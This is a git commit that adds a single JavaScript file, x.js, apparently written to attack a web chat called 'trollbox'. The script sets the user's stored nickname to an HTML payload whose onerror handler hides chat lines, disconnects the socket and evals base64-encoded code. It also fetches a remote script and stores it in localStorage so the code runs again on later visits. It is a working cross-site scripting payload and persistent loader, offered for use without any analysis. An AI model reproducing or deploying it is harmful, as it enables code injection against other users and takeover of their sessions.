daacfc8adc4cf2164cfeac522a25d8d2d24e6ba8
dell-optiplex-790 <dell.optiplex.d4719126@gmail.com>
2024-10-29 15:06:18 +0100

    Add files via upload

---
+++ x.js
@@ -0,0 +1,14 @@
+(s=>top.location.href=URL.createObjectURL(new Blob([s],{type:'text/html'})))
+(`
+<script>
+async function e() {
+if(!localStorage.getItem('.config/trollbox/tbjb')) {
+	localStorage.setItem('.config/trollbox/_nick',
+		localStorage.getItem('.config/trollbox/nick'));
+
+	localStorage.setItem('.config/trollbox/nick', \`tbjb<img src='https://' onerror='document.querySelector("#trollbox_nick_btn").innerText=localStorage.getItem(".config/trollbox/_nick");socket.disconnect(),document.body.querySelectorAll(".trollbox_line").forEach(e=>e.parentElement.removeChild(e));eval(atob(localStorage.getItem(".config/trollbox/tbjb")))'>\`);
+	localStorage.setItem('.config/trollbox/tbjb', btoa(await (await fetch('<!site>tb.js')).text()))
+}
+}e()
+</script>
+`)
